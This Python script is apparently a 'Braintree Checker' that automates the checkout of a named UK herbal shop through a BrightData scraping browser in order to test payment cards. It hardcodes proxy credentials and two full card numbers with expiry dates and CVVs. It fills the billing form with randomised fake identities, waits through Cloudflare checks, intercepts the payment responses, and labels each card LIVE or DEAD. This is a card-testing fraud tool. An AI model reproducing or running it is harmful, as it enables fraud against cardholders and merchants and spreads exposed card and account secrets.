#!/usr/bin/env python3
"""
Herbs Hands Healing - Braintree via BrightData Playwright
"""

from playwright.sync_api import sync_playwright
import time
import random
import json

# ═══ BrightData Config ═══
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"
BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"

# ═══ Site ═══
SITE_URL = "https://shop.herbs-hands-healing.co.uk"
CHECKOUT_URL = f"{SITE_URL}/checkout"

# ═══ Cards ═══
CARDS = [
    "5104040287872188|12|2027|951",
    "5156786158125943|07|2028|829",
]

# ═══ Identity ═══
FIRST_NAMES = ["James", "John", "Robert", "Michael"]
LAST_NAMES = ["Smith", "Johnson", "Williams"]

# ═══ UK Addresses ═══
ADDRESSES = [
    {"address": "123 Oxford Street", "city": "London", "postcode": "W1D 2HG"},
    {"address": "45 High Street", "city": "Manchester", "postcode": "M1 1AA"},
    {"address": "78 Queen Street", "city": "Birmingham", "postcode": "B1 1AA"},
]


def connect_browser(p):
    """اتصل بـ BrightData Scraping Browser"""
    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
    print("🌐 Connecting to BrightData...")
    browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
    print("✅ Connected\n")
    return browser


def check_card(browser, card, idx, total):
    """فحص بطاقة واحدة"""
    t0 = time.time()
    
    parts = card.strip().split("|")
    if len(parts) < 4:
        return "INVALID_FORMAT", "Bad format", 0
    
    num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    if len(yy) == 2:
        yy = "20" + yy
    
    print(f"{'═'*60}")
    print(f"🔍 [{idx}/{total}] {num[:6]}****{num[-4:]}")
    print(f"{'═'*60}")
    
    context = None
    try:
        context = browser.new_context(
            viewport={"width": 1366, "height": 900},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        )
        page = context.new_page()
        
        # Intercept responses
        page.add_init_script("""
            window.__all_responses = [];
            const origFetch = window.fetch;
            window.fetch = async function(...args) {
                const response = await origFetch.apply(this, args);
                const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
                try {
                    const clone = response.clone();
                    const body = await clone.text();
                    window.__all_responses.push({
                        url: url,
                        status: response.status,
                        body: body
                    });
                } catch(e) {}
                return response;
            };
        """)
        
        # ═══ Step 1: Load checkout ═══
        print("📄 [1/7] Loading checkout...")
        page.goto(CHECKOUT_URL, timeout=90000, wait_until="domcontentloaded")
        time.sleep(3)
        
        # ═══ Step 2: Wait for Cloudflare Turnstile ═══
        print("🛡️  [2/7] Waiting for Cloudflare Turnstile...")
        for i in range(60):
            title = page.title()
            if "checking" in title.lower() or "just a moment" in title.lower():
                if i % 5 == 0:
                    print(f"       ⏳ Waiting ({i}s)...")
                time.sleep(1)
            else:
                print(f"       ✅ Cloudflare passed: {title[:50]}")
                break
        
        # ═══ Step 3: Wait for form ═══
        print("📝 [3/7] Waiting for checkout form...")
        try:
            page.wait_for_selector("#billing_first_name", timeout=30000)
            print("       ✅ Form visible")
        except:
            print("       ⚠️ Form not found")
            try:
                context.close()
            except:
                pass
            return "NO_FORM", "Form not loaded", round(time.time() - t0, 1)
        
        # ═══ Step 4: Fill billing ═══
        print("📝 [4/7] Filling billing info...")
        f = random.choice(FIRST_NAMES)
        l = random.choice(LAST_NAMES)
        em = f"{f.lower()}.{l.lower()}{random.randint(100,999)}@gmail.com"
        ad = random.choice(ADDRESSES)
        
        try:
            page.fill("#billing_first_name", f)
            page.fill("#billing_last_name", l)
            page.fill("#billing_address_1", ad["address"])
            page.fill("#billing_city", ad["city"])
            page.fill("#billing_postcode", ad["postcode"])
            page.fill("#billing_phone", "07123456789")
            page.fill("#billing_email", em)
            print(f"       ✅ Filled ({f} {l})")
        except Exception as e:
            print(f"       ⚠️ Fill error: {e}")
        
        # ═══ Step 5: Fill card in Hosted Fields ═══
        print("💳 [5/7] Filling card via Braintree Hosted Fields...")
        
        # Braintree hosted fields - محتاج نتفاعل مع iframes
        try:
            # Card number iframe
            card_number_iframe = None
            for frame in page.frames:
                if "card-number" in (frame.name or "") or "wc-braintree-card-number" in (frame.url or ""):
                    card_number_iframe = frame
                    break
            
            # Alternative: ابحث عن input مباشرة في الـ iframes
            print(f"       📋 Total frames: {len(page.frames)}")
            
            for frame in page.frames:
                try:
                    # Card number
                    if frame.locator("input[name='number']").count() > 0:
                        frame.fill("input[name='number']", num)
                        print(f"       ✅ Card number filled")
                    
                    # Expiry
                    if frame.locator("input[name='expirationDate']").count() > 0:
                        frame.fill("input[name='expirationDate']", f"{mm}/{yy[2:]}")
                        print(f"       ✅ Expiry filled")
                    elif frame.locator("input[name='expiration']").count() > 0:
                        frame.fill("input[name='expiration']", f"{mm}/{yy[2:]}")
                        print(f"       ✅ Expiry filled")
                    
                    # CVV
                    if frame.locator("input[name='cvv']").count() > 0:
                        frame.fill("input[name='cvv']", cvv)
                        print(f"       ✅ CVV filled")
                except:
                    continue
        except Exception as e:
            print(f"       ⚠️ Hosted fields error: {e}")
        
        time.sleep(2)
        
        # ═══ Step 6: Accept terms & click place order ═══
        print("👆 [6/7] Clicking Place Order...")
        try:
            page.check("#terms")
            page.check("#gdpr_woo_consent")
        except:
            pass
        
        time.sleep(1)
        
        try:
            page.click("#place_order")
            print("       ✅ Clicked")
        except:
            print("       ⚠️ Could not click")
        
        # ═══ Step 7: Wait for response ═══
        print("⏳ [7/7] Waiting for response...")
        result_code = "UNKNOWN"
        result_text = ""
        
        for i in range(40):
            time.sleep(1)
            
            # Check all responses
            try:
                responses = page.evaluate("() => window.__all_responses || []")
                for r in reversed(responses):
                    url = r.get('url', '')
                    body = r.get('body', '')
                    
                    # Skip assets
                    if any(x in url for x in ['.js', '.css', '.png', '.jpg', '.woff']):
                        continue
                    
                    # Check braintree responses
                    if 'braintree' in url.lower() or 'checkout' in url.lower():
                        try:
                            data = json.loads(body)
                            
                            # Error check
                            if 'errors' in data:
                                errors = data['errors']
                                if errors:
                                    error_code = errors[0].get('extensions', {}).get('errorCode', '')
                                    error_msg = errors[0].get('message', '')
                                    
                                    if 'INSUFFICIENT_FUNDS' in error_code or 'insufficient' in error_msg.lower():
                                        result_code = "INSUFFICIENT_FUNDS"
                                    elif 'DO_NOT_HONOR' in error_code:
                                        result_code = "DO_NOT_HONOR"
                                    elif 'DECLINED' in error_code:
                                        result_code = "DECLINED"
                                    else:
                                        result_code = error_code or "DECLINED"
                                    result_text = error_msg[:200]
                                    break
                            
                            # Success check
                            if 'result' in data and data.get('result') == 'success':
                                result_code = "CHARGE $1"
                                result_text = "Order placed successfully"
                                break
                            
                            # Check for payment_method_nonce
                            if 'payment_method_nonce' in str(data):
                                result_code = "TOKENIZED"
                                result_text = "Card tokenized"
                        except:
                            # Not JSON, check text
                            body_lower = body.lower()
                            if 'insufficient' in body_lower:
                                result_code = "INSUFFICIENT_FUNDS"
                                break
                            elif 'declined' in body_lower:
                                result_code = "DECLINED"
                                break
                            elif 'do not honor' in body_lower:
                                result_code = "DO_NOT_HONOR"
                                break
                if result_code != "UNKNOWN":
                    break
            except:
                pass
            
            # Check page text
            try:
                page_text = page.inner_text("body")
                text_lower = page_text.lower()
                
                if 'thank you' in text_lower and 'order' in text_lower:
                    result_code = "CHARGE $1"
                    result_text = "Thank you page"
                    break
                elif 'insufficient' in text_lower:
                    result_code = "INSUFFICIENT_FUNDS"
                    break
                elif 'declined' in text_lower:
                    result_code = "DECLINED"
                    break
                elif 'do not honor' in text_lower:
                    result_code = "DO_NOT_HONOR"
                    break
            except:
                pass
            
            if (i + 1) % 5 == 0:
                print(f"       ⏳ {i+1}s...")
        
        try:
            context.close()
        except:
            pass
        
    except Exception as e:
        print(f"❌ Error: {str(e)[:150]}")
        result_code = f"ERR: {str(e)[:60]}"
        result_text = str(e)[:100]
        if context:
            try:
                context.close()
            except:
                pass
    
    elapsed = round(time.time() - t0, 1)
    print(f"\n📝 {result_code}")
    if result_text:
        print(f"   💬 {result_text}")
    print(f"⏱️  {elapsed}s\n")
    
    return result_code, result_text, elapsed


def main():
    print("=" * 60)
    print("  🌿 Herbs Hands Healing - Braintree Checker")
    print("  🚀 Using BrightData Scraping Browser")
    print("=" * 60)
    print(f"\n  💳 Cards: {len(CARDS)}")
    for i, c in enumerate(CARDS, 1):
        print(f"     {i}. {c}")
    print()
    
    with sync_playwright() as p:
        browser = connect_browser(p)
        
        results = []
        for idx, card in enumerate(CARDS, 1):
            try:
                code, text, elapsed = check_card(browser, card, idx, len(CARDS))
            except Exception as e:
                print(f"❌ Card error: {str(e)[:100]}")
                code, text, elapsed = f"ERR: {str(e)[:60]}", str(e)[:100], 0
            
            results.append({
                'card': card,
                'code': code,
                'text': text,
                'elapsed': elapsed,
            })
            
            if idx < len(CARDS):
                delay = random.uniform(8, 15)
                print(f"⏸️  Waiting {delay:.1f}s...\n")
                time.sleep(delay)
        
        try:
            browser.close()
        except:
            pass
    
    # Summary
    print("=" * 60)
    print("📊 النتائج النهائية")
    print("=" * 60)
    
    live_codes = ['INSUFFICIENT_FUNDS', 'DECLINED', 'DO_NOT_HONOR', 
                  'EXPIRED_CARD', 'CVV_INVALID', 'CHARGE $1', 'TOKENIZED']
    
    live_count = 0
    dead_count = 0
    error_count = 0
    
    for r in results:
        code = r['code']
        if code in live_codes:
            status = "🔥 LIVE"
            live_count += 1
        elif code.startswith('ERR') or code in ['NO_FORM', 'UNKNOWN']:
            status = "⚠️ ERROR"
            error_count += 1
        else:
            status = "❌ DEAD"
            dead_count += 1
        
        print(f"\n💳 {r['card']}")
        print(f"   📝 {r['code']}")
        if r['text']:
            print(f"   💬 {r['text']}")
        print(f"   {status} | ⏱️ {r['elapsed']}s")
    
    print(f"\n{'='*60}")
    print(f"🔥 Live:   {live_count}")
    print(f"❌ Dead:   {dead_count}")
    print(f"⚠️  Errors: {error_count}")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
